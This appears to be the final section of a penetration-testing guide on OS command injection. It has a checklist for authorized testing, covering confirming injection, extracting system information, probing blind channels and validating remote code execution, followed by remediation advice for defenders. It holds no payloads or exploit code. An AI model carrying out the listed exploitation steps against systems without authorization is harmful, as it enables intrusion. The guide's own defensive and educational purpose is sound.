## ✅ Final Checklist Before Reporting
- Confirmed injection exists
- Identified target OS
- Extracted system information
- Tested blind channel (if needed)
- Validated impact / potential RCE
- Documented reproducible steps and screenshots
- Proposed remediation
- Removed created files/shells (during authorized testing)

---

## 🛡️ Remediation (Defender View)
- Avoid shell execution APIs when possible (`system`, `exec`, `popen`, etc.).
- Use allowlists for expected input values.
- Use safe parameterized APIs (no command string concatenation).
- Run services with least privilege.
- Isolate execution context (containers, seccomp, AppArmor).
- Add monitoring for suspicious subprocess and outbound DNS/HTTP traffic.
